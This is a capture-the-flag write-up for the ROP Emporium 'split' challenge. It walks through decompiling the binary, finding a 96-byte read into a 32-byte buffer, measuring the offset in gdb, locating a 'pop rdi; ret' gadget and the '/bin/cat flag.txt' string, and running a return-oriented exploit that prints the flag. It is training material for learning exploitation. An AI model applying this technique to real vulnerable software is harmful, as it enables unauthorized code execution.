# [split](https://ropemporium.com/challenge/split.html)

Let's test the program :

```console
$ ./split                 
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> test
Thank you!

Exiting
```

# Static analysis

Using ghidra we can find those functions :

```C
undefined8 main(void)
{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("split by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}

void pwnme(void)
{
  undefined local_28 [32];
  
  memset(local_28,0,32);
  puts("Contriving a reason to ask user for data...");
  printf("> ");
  read(0,local_28,96);
  puts("Thank you!");
  return;
}

void usefulFunction(void)
{
  system("/bin/ls");
  return;
}
```

In the description of the challenge, we're told there is a "/bin/cat flag.txt" string in the binary.  
  
The read() function in pwnme() is expecting 96 bytes even tho the local_28 variable is 32 bytes long. This i vulnerable to a buffer overflow.  
  
Let's exploit this to run the system call in usefulFunction() with the "/bin/cat flag.txt" string as parameter.

# Dynamic analysis

Using gdb, we'll find out how many bytes we need to send to modify the return address.  

Let's take a look at the stack after we've send 32 bytes :

```gdb
gef➤  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32)')
```

```gdb
─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffda30│+0x0000: 0x4141414141414141	 ← $rsp, $rsi
0x00007fffffffda38│+0x0008: 0x4141414141414141
0x00007fffffffda40│+0x0010: 0x4141414141414141
0x00007fffffffda48│+0x0018: 0x4141414141414141
0x00007fffffffda50│+0x0020: 0x00007fffffffda0a  →  0xdb7800007fffffff	 ← $rbp
0x00007fffffffda58│+0x0028: 0x00000000004006d7  →  <main+0040> mov edi, 0x400806
0x00007fffffffda60│+0x0030: 0x0000000000000001
0x00007fffffffda68│+0x0038: 0x00007ffff7df16ca  →  <__libc_start_call_main+007a> mov edi, eax
```

We can see that the rbp is stored right after the variable : our payload will have an offset of 32 bytes.  
  
Let's find the "/bin/cat flag.txt" string using pwntool :

```python
from pwn import *

binary = ELF("./split")
string = next(binary.search(b"/bin/cat"))

print(string)
```

```console
$ python3 cat.py    
[*] '/home/coucou/Documents/ROP_Emporium/02_split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
6295648
```

```gdb
gef➤  x/s 6295648
0x601060 <usefulString>:	"/bin/cat flag.txt"
```

Finally to run the system call with another argument we need to modify the rdi, let's find a gadget to do so :

```console
$ ROPgadget --binary split | grep rdi             
0x0000000000400288 : loope 0x40025a ; sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
0x00000000004007c3 : pop rdi ; ret
0x000000000040028a : sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
```

```gdb
gef➤  x/2wi 0x00000000004007c3
   0x4007c3 <__libc_csu_init+99>:	pop    rdi
   0x4007c4 <__libc_csu_init+100>:	ret
```

We got all we need, let's write an exploit.

# Exploit

We'll use [this script](./exploit.py) to send our payload :

```console
$ python3 exploit.py 
[*] '/home/coucou/Documents/ROP_Emporium/02_split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/coucou/Documents/ROP_Emporium/02_split/split': pid 27166
[*] Switching to interactive mode
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> $ 
[*] Stopped process '/home/coucou/Documents/ROP_Emporium/02_split/split' (pid 27166)
```

The program returned the flag, our exploit is working !
